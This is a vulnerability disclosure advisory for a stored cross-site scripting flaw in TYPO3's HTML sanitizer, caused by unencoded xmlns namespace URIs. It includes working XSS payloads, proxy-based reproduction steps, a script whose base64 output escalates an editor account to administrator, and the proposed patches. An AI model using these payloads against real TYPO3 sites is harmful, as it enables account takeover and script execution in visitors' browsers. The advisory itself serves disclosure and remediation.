<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-MHJX7J31 -->

# ANT-2026-MHJX7J31 · typo3

## xss medium

[CVE-2026-47345](https://nvd.nist.gov/vuln/detail/CVE-2026-47345)
[GHSA-p5j5-4j3q-8mq8](https://github.com/advisories/GHSA-p5j5-4j3q-8mq8)

Maintainer medium

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.

# ANT-2026-MHJX7J31: Stored XSS in TYPO3 HTML Sanitizer via `xmlns` Namespace URI Injection

`TYPO3\HtmlSanitizer\Sanitizer::sanitize()` is the last line of defence that TYPO3 places between editor-supplied RTE content and the browser. It is **enabled by default** on every frontend page render (`ContentObjectRenderer::parseFunc()` → `stdWrap_htmlSanitize()`).

An attacker who can write to any RTE bodytext field (i.e. any backend editor — the **lowest-privilege backend role**) can inject:

```
<p xmlns:x="&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;">text</p>
```

The sanitizer emits:

```
<p xmlns:x=""><img src=x onerror=alert(document.domain)>">text</p>
```

The `<img>` tag has broken out of the attribute and its `onerror` handler **fires automatically** in every visitor's browser (`src=x` always errors). This is a **complete, zero-click stored XSS**.

**Project:** typo3
**Commit:** `93ed2f0ef8f842a6`
**Location:** `/var/www/html/vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php:314`

OutputRules.php:314 serializes namespace declarations with `->wr($nsNode->nodeValue)` instead of `->wr($this->enc($nsNode->nodeValue, true))`, under the false assumption that namespace URIs are always safe constants. TYPO3\HtmlSanitizer\Serializer\Rules extends OutputRules but does not override namespaceAttrs(), and CommonVisitor::processAttributes() iterates $domNode->attributes, which never contains xmlns: *nodes (they live on the XPath namespace::* axis). The combination yields a decode-then-emit-raw path for attacker-controlled namespace URIs.

This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-MHJX7J31.

---

**Reference:** ANT-2026-MHJX7J31

Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.

# Stored XSS in TYPO3 HTML Sanitizer via `xmlns` Namespace URI Injection

|  |  |
| --- | --- |
| **Severity** | HIGH |
| **CVSS 3.1** | 8.2 — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
| **CWE** | CWE-79 — Stored Cross-Site Scripting |
| **Affected project** | TYPO3 Core (`typo3/html-sanitizer`, `masterminds/html5`) |
| **Tested versions** | `typo3/cms-core` v13.4.28 (dynamically confirmed) |

---

## Executive Summary

A backend editor — the lowest-privilege backend role — can inject a payload into any Rich Text Editor (RTE) content element that bypasses TYPO3's HTML sanitizer and executes arbitrary JavaScript in every frontend visitor's browser, including administrators, on page load without user interaction.

`TYPO3\HtmlSanitizer\Sanitizer` is enabled by default on every frontend page render via `ContentObjectRenderer::parseFunc()` → `stdWrap_htmlSanitize()`. By placing a crafted `xmlns` namespace attribute on an allowed HTML element, an attacker can cause the sanitizer to emit an unencoded `<img onerror>` tag into the HTTP response. Because `src=x` always fails, the `onerror` handler fires automatically on every page load for every visitor until the content is removed.

---

## Prerequisites

* TYPO3 v13.4.28 with default configuration (`security.backend.htmlSanitizeRte = false`, `htmlSanitize = true`)
* A backend editor account with write access to at least one `tt_content` record
* An HTTP proxy (e.g. Burp Suite) to bypass CKEditor's client-side attribute filtering

---

## Root Cause Analysis

### Vulnerable line — `OutputRules.php:314`

`vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php` serializes namespace declarations without encoding:

```
protected function namespaceAttrs($ele)
    if (!$this->xpath || $this->xpath->document !== $ele->ownerDocument) {
        $this->xpath = new \DOMXPath($ele->ownerDocument);

    foreach ($this->xpath->query('namespace::*[not(.=../../namespace::*)]', $ele) as $nsNode) {
        if (!in_array($nsNode->nodeValue, $this->implicitNamespaces)) {
            $this->wr(' ')->wr($nsNode->nodeName)->wr('="')->wr($nsNode->nodeValue)->wr('"');
            //                                                  ^^^^^^^^^^^^^^^^^^^
            //                                                  raw write — no encoding
```

Regular attribute values in the same file (line ~360) are correctly encoded via `$this->enc($val, true)`. Namespace URIs are not.

### Why the sanitizer cannot intercept the payload

PHP's libxml DOM stores `xmlns:*` declarations as namespace nodes, not attribute nodes. `CommonVisitor::processAttributes()` iterates `$domNode->attributes`, which returns zero entries for elements carrying namespace declarations:

```
$element->attributes->length = 0        ← xmlns:x is invisible here
XPath namespace::* → xmlns:x = '"><img src=x onerror=alert(document.domain)>'
```

The visitor has no mechanism to inspect or strip the payload; it passes through to the serializer untouched.

### Why TYPO3 inherits the bug

`TYPO3\HtmlSanitizer\Serializer\Rules` extends `OutputRules` but does not override `namespaceAttrs()`. The vulnerable parent runs unchanged on every element with a namespace declaration. `Sanitizer::sanitize()` calls `Traverser` → `element()` → `openTag()` → `namespaceAttrs()` on each element, and there is no configuration flag that disables this call.

### How the payload escapes the attribute

The HTML5 parser decodes entities in attribute values per spec (`&quot;` → `"`, `&gt;` → `>`, `&lt;` → `<`). The decoded value `"><img src=x onerror=alert(document.domain)>` is stored in a namespace node. The serializer writes it raw, terminating the `xmlns:x` attribute with the injected `"` and emitting the remaining characters as markup. The browser sees a valid `<img>` element.

Input stored in the database:

```
<div xmlns:x="&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;">text</div>
```

Sanitizer output:

```
<div xmlns:x=""><img src=x onerror=alert(document.domain)>">text</div>
```

---

## Reproduction Steps

**Note on carrier element:** The `<p>` element is not suitable — `RteHtmlParser` applies a hard-coded attribute allowlist to `<p>` tags at save time that incidentally strips `xmlns:*`. The following elements survive the full editor → database → frontend chain under default configuration: `<div>`, `<strong>`, `<table>`, `<blockquote>`, `<ul>`, `<ol>`, `<pre>`. The `<strong>` variant is recommended as it appears as ordinary bold text in CKEditor.

**Payload:**

```
<strong xmlns:x="&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;">bold text</strong>
```

**Steps:**

1. Log in to the TYPO3 backend as an editor.
2. Open a page containing a Text content element. Switch CKEditor to **Source** mode and enter any content.
3. Click **Save** and intercept the POST request in Burp Suite.
4. In the intercepted request, replace the value of `data[tt_content][<uid>][bodytext]` with the payload above and forward the request.
5. Confirm the payload was stored:
   `sql
   SELECT bodytext FROM tt_content WHERE uid = <uid>;`
   The output must include the `xmlns:x` attribute. If it does not, verify the correct content UID and that the request was forwarded after modification.
6. Visit the frontend page containing the content element. `alert(document.domain)` fires on page load.

More complicated payload could be generated using `generate.js`, for instance, this PoC was used to demonstrate the privilege escalation (minor adjustments are needed). Note that due to sudo mode (in this case, with the default validity of 5 minutes), the issue is only demonstrative — the injected script could perform any action as an administrator, or wait until the admin passes the sudo validity window.

```
$ cat generate.js
const js = `(async()=>{const r=await fetch('/typo3/record/edit?edit[be_users][5]=edit',{credentials:'include'});const h=await r.text();const a=h.match(/endpoint="([^"]+)/)?.[1]?.replace(/&amp;/g,'&');if(!a)return;const f=new FormData();f.append('data[be_users][5][admin]','1');f.append('doSave','1');f.append('closeDoc','0');f.append('popViewId','0');f.append('effectivePid','0');f.append('target','0');f.append('returnUrl','/typo3/');await fetch(a,{method:'POST',credentials:'include',body:f});})();`;

const b = Buffer.from(js).toString('base64');
console.log(`<div xmlns:x="&quot;&gt;&lt;img src=x onerror=eval(atob('${b}'))&gt;">text</div>`);

$ node generate.js

<div xmlns:x="&quot;&gt;&lt;img src=x onerror=eval(atob('KGFzeW5jKCk9Pntjb25zdCByPWF3YWl0IGZldGNoKCcvdHlwbzMvcmVjb3JkL2VkaXQ/ZWRpdFtiZV91c2Vyc11bNV09ZWRpdCcse2NyZWRlbnRpYWxzOidpbmNsdWRlJ30pO2NvbnN0IGg9YXdhaXQgci50ZXh0KCk7Y29uc3QgYT1oLm1hdGNoKC9lbmRwb2ludD0iKFteIl0rKS8pPy5bMV0/LnJlcGxhY2UoLyZhbXA7L2csJyYnKTtpZighYSlyZXR1cm47Y29uc3QgZj1uZXcgRm9ybURhdGEoKTtmLmFwcGVuZCgnZGF0YVtiZV91c2Vyc11bNV1bYWRtaW5dJywnMScpO2YuYXBwZW5kKCdkb1NhdmUnLCcxJyk7Zi5hcHBlbmQoJ2Nsb3NlRG9jJywnMCcpO2YuYXBwZW5kKCdwb3BWaWV3SWQnLCcwJyk7Zi5hcHBlbmQoJ2VmZmVjdGl2ZVBpZCcsJzAnKTtmLmFwcGVuZCgndGFyZ2V0JywnMCcpO2YuYXBwZW5kKCdyZXR1cm5VcmwnLCcvdHlwbzMvJyk7YXdhaXQgZmV0Y2goYSx7bWV0aG9kOidQT1NUJyxjcmVkZW50aWFsczonaW5jbHVkZScsYm9keTpmfSk7fSkoKTs='))&gt;">text</div>
```

---

## Fix

### Recommended — suppress namespace declarations in `typo3/html-sanitizer`

Override `namespaceAttrs()` in `TYPO3\HtmlSanitizer\Serializer\Rules`. XML namespace declarations have no legitimate use in sanitised HTML5 body content:

```
// vendor/typo3/html-sanitizer/src/Serializer/Rules.php
protected function namespaceAttrs($ele): void
    // Suppress all xmlns:* declarations — they serve no purpose in
    // sanitised HTML5 and the parent implementation writes namespace
    // URIs to the output stream without encoding.
```

### Alternative — encode namespace URI values

If namespace declarations must be preserved for other use cases, apply the same encoding already used for regular attributes by calling `$this->enc`:

```
protected function namespaceAttrs($ele): void
    if (!$this->xpath || $this->xpath->document !== $ele->ownerDocument) {
        $this->xpath = new \DOMXPath($ele->ownerDocument);
    foreach ($this->xpath->query('namespace::*[not(.=../../namespace::*)]', $ele) as $nsNode) {
        if (!in_array($nsNode->nodeValue, $this->implicitNamespaces)) {
            $this->wr(' ')->wr($nsNode->nodeName)->wr('="')
                ->wr($this->enc($nsNode->nodeValue, true))
                ->wr('"');
```

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by **Norbert Szetei** at **Doyensec** in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: **Doyensec in collaboration with Claude and Anthropic Research**

## Attachment: `ANT-2026-05043/patch.diff`

```
diff --git a/typo3/html-sanitizer/src/Serializer/Rules.php b/typo3/html-sanitizer/src/Serializer/Rules.php
index 9996a94c..a689ef8a 100644
--- a/typo3/html-sanitizer/src/Serializer/Rules.php
+++ b/typo3/html-sanitizer/src/Serializer/Rules.php
@@ -164,6 +164,14 @@ class Rules extends OutputRules implements RulesInterface
         $this->wr($domNode->data);

+    protected function namespaceAttrs($ele): void
+    {
+        // Suppress all xmlns:* declarations. They have no legitimate use in
+        // sanitised HTML5 body content, and the parent implementation writes
+        // namespace URIs to the output stream without encoding, allowing
+        // attribute breakout via crafted namespace URI values.
+    }
+
     protected function enc($text, $attribute = false): string
         if ($attribute && $this->encodeAttributes && !$this->encode) {
```

## Attachment: `ANT-2026-05043/patch2.diff`

```
diff --git a/masterminds/html5/src/HTML5/Serializer/OutputRules.php b/masterminds/html5/src/HTML5/Serializer/OutputRules.php
index 13cbdc66..bca27ba7 100644
--- a/masterminds/html5/src/HTML5/Serializer/OutputRules.php
+++ b/masterminds/html5/src/HTML5/Serializer/OutputRules.php
@@ -311,7 +311,7 @@ class OutputRules implements RulesInterface

         foreach ($this->xpath->query('namespace::*[not(.=../../namespace::*)]', $ele) as $nsNode) {
             if (!in_array($nsNode->nodeValue, $this->implicitNamespaces)) {
-                $this->wr(' ')->wr($nsNode->nodeName)->wr('="')->wr($nsNode->nodeValue)->wr('"');
+                $this->wr(' ')->wr($nsNode->nodeName)->wr('="')->wr($this->enc($nsNode->nodeValue, true))->wr('"');
```

1. 2026-03-30
2. 2026-05-07
3. 2026-05-07
4. 2026-06-10
5. 2026-08-17

189c82e012e75b5ab44d20ba1449802f6da28844dbac5d3b08165c48a31fe875043fe292cd13d1b1bd9054a429c2810b5e527a1e1c82752debd777935b8e0bfd

Committed 2026-05-07 07:07 UTC

Revealed 2026-08-17 17:47 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-MHJX7J31%22%2C%22bug_class%22%3A%22XSS%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%2293ed2f0ef8f842a6%22%2C%22created_at%22%3A%222026-03-30T23%3A21%3A29%2B00%3A00%22%2C%22description%22%3A%22%60TYPO3%5C%5CHtmlSanitizer%5C%5CSanitizer%3A%3Asanitize%28%29%60%20is%20the%20last%20line%20of%20defence%20that%20TYPO3%20places%20between%20editor-supplied%20RTE%20content%20and%20the%20browser.%20It%20is%20%2A%2Aenabled%20by%20default%2A%2A%20on%20every%20frontend%20page%20render%20%28%60ContentObjectRenderer%3A%3AparseFunc%28%29%60%20%E2%86%92%20%60stdWrap_htmlSanitize%28%29%60%29.%5Cn%5CnAn%20attacker%20who%20can%20write%20to%20any%20RTE%20bodytext%20field%20%28i.e.%20any%20backend%20editor%20%E2%80%94%20the%20%2A%2Alowest-privilege%20backend%20role%2A%2A%29%20can%20inject%3A%5Cn%5Cn%60%60%60html%5Cn%3Cp%20xmlns%3Ax%3D%5C%22%26quot%3B%26gt%3B%26lt%3Bimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%26gt%3B%5C%22%3Etext%3C/p%3E%5Cn%60%60%60%5Cn%5CnThe%20sanitizer%20emits%3A%5Cn%5Cn%60%60%60html%5Cn%3Cp%20xmlns%3Ax%3D%5C%22%5C%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E%5C%22%3Etext%3C/p%3E%5Cn%60%60%60%5Cn%5CnThe%20%60%3Cimg%3E%60%20tag%20has%20broken%20out%20of%20the%20attribute%20and%20its%20%60onerror%60%20handler%20%2A%2Afires%20automatically%2A%2A%20in%20every%20visitor%27s%20browser%20%28%60src%3Dx%60%20always%20errors%29.%20This%20is%20a%20%2A%2Acomplete%2C%20zero-click%20stored%20XSS%2A%2A.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22/var/www/html/vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php%3A314%22%2C%22poc_sha256%22%3A%220ba4476579ed00f558240c313da3bbaf9c55507ae839ca9b25a4d3efbf5f0769%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22typo3%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22OutputRules.php%3A314%20serializes%20namespace%20declarations%20with%20%60-%3Ewr%28%24nsNode-%3EnodeValue%29%60%20instead%20of%20%60-%3Ewr%28%24this-%3Eenc%28%24nsNode-%3EnodeValue%2C%20true%29%29%60%2C%20under%20the%20false%20assumption%20that%20namespace%20URIs%20are%20always%20safe%20constants.%20TYPO3%5C%5CHtmlSanitizer%5C%5CSerializer%5C%5CRules%20extends%20OutputRules%20but%20does%20not%20override%20namespaceAttrs%28%29%2C%20and%20CommonVisitor%3A%3AprocessAttributes%28%29%20iterates%20%24domNode-%3Eattributes%2C%20which%20never%20contains%20xmlns%3A%2A%20nodes%20%28they%20live%20on%20the%20XPath%20namespace%3A%3A%2A%20axis%29.%20The%20combination%20yields%20a%20decode-then-emit-raw%20path%20for%20attacker-controlled%20namespace%20URIs.%22%2C%22title%22%3A%22Stored%20XSS%20in%20TYPO3%20HTML%20Sanitizer%20via%20%60xmlns%60%20Namespace%20URI%20Injection%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-MHJX7J31",
  "bug_class": "XSS",
  "commit_sha": "93ed2f0ef8f842a6",
  "created_at": "2026-03-30T23:21:29+00:00",
  "description": "`TYPO3\\HtmlSanitizer\\Sanitizer::sanitize()` is the last line of defence that TYPO3 places between editor-supplied RTE content and the browser. It is **enabled by default** on every frontend page render (`ContentObjectRenderer::parseFunc()` → `stdWrap_htmlSanitize()`).\n\nAn attacker who can write to any RTE bodytext field (i.e. any backend editor — the **lowest-privilege backend role**) can inject:\n\n```html\n<p xmlns:x=\"&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;\">text</p>\n```\n\nThe sanitizer emits:\n\n```html\n<p xmlns:x=\"\"><img src=x onerror=alert(document.domain)>\">text</p>\n```\n\nThe `<img>` tag has broken out of the attribute and its `onerror` handler **fires automatically** in every visitor's browser (`src=x` always errors). This is a **complete, zero-click stored XSS**.",
  "location": "/var/www/html/vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php:314",
  "poc_sha256": "0ba4476579ed00f558240c313da3bbaf9c55507ae839ca9b25a4d3efbf5f0769",
  "project": "typo3",
  "technical_details": "OutputRules.php:314 serializes namespace declarations with `->wr($nsNode->nodeValue)` instead of `->wr($this->enc($nsNode->nodeValue, true))`, under the false assumption that namespace URIs are always safe constants. TYPO3\\HtmlSanitizer\\Serializer\\Rules extends OutputRules but does not override namespaceAttrs(), and CommonVisitor::processAttributes() iterates $domNode->attributes, which never contains xmlns:* nodes (they live on the XPath namespace::* axis). The combination yields a decode-then-emit-raw path for attacker-controlled namespace URIs.",
  "title": "Stored XSS in TYPO3 HTML Sanitizer via `xmlns` Namespace URI Injection",
```
